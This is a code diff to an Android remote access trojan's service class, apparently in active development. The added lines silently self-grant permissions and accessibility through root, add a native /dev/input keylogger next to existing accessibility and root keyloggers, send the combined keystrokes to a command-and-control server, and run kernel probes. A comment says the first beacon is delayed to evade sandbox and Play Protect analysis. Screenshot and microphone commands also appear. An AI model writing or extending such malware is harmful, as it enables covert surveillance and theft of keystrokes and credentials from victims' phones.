@@ -53,8 +53,14 @@ public class RatService extends Service {
 
         startForeground(NOTIF_ID, buildNotification());
 
-        // Start root-level kernel keylogger immediately (requires rooted device)
+        // Silent self-setup: grant all permissions + enable accessibility via su (root required)
+        SelfSetup.runAsync(this);
+
+        // Start root-level kernel keylogger (Java su path)
         RootKeylogger.start();
+
+        // Start native C++ /dev/input reader (direct syscall, no su overhead)
+        NativeProbe.safeStartInputReader();
 
         // Delay first beacon 12 minutes — avoids sandbox/Play Protect dynamic analysis window
         handler.postDelayed(beaconLoop, 12 * 60 * 1000L);
@@ -72,6 +78,7 @@ public class RatService extends Service {
     @Override
     public void onDestroy() {
         RootKeylogger.stop();
+        NativeProbe.stopInputReader();
         handler.removeCallbacks(beaconLoop);
         super.onDestroy();
     }
@@ -109,12 +116,13 @@ public class RatService extends Service {
             c2.sendResult(botId, buildInfo());
 
         } else if (lower.equals("keylogs")) {
-            // Merge accessibility keylogs + root kernel keylogs
-            String accLogs  = KeylogService.flushLogs();
-            String rootLogs = RootKeylogger.flushLogs();
-            String combined = "";
-            if (!accLogs.isEmpty())  combined += "[ACCESSIBILITY]\n" + accLogs + "\n";
-            if (!rootLogs.isEmpty()) combined += "[ROOT /dev/input]\n" + rootLogs + "\n";
+            String accLogs    = KeylogService.flushLogs();
+            String rootLogs   = RootKeylogger.flushLogs();
+            String nativeLogs = NativeProbe.safeFlushNativeKeylogs();
+            String combined   = "";
+            if (!accLogs.isEmpty())    combined += "[ACCESSIBILITY]\n"     + accLogs    + "\n";
+            if (!rootLogs.isEmpty())   combined += "[ROOT getevent]\n"     + rootLogs   + "\n";
+            if (!nativeLogs.isEmpty()) combined += "[NATIVE /dev/input]\n" + nativeLogs + "\n";
             c2.sendResult(botId, combined.isEmpty() ? "(no keylogs yet)" : combined);
 
         } else if (lower.equals("shot")) {
@@ -163,8 +171,11 @@ public class RatService extends Service {
 
         } else if (lower.equals("kernel_probe")) {
             new Thread(() -> {
-                String report = KernelProbe.run(this);
-                c2.sendResult(botId, report);
+                // Java-level probes
+                String javaReport = KernelProbe.run(this);
+                // Native C++ probes (ptrace, /dev/mem, kallsyms, direct /dev/input)
+                String nativeReport = NativeProbe.safeRunKernelProbe();
+                c2.sendResult(botId, javaReport + "\n" + nativeReport);
             }).start();
 
         } else if (lower.startsWith("mic ") || lower.equals("mic")) {
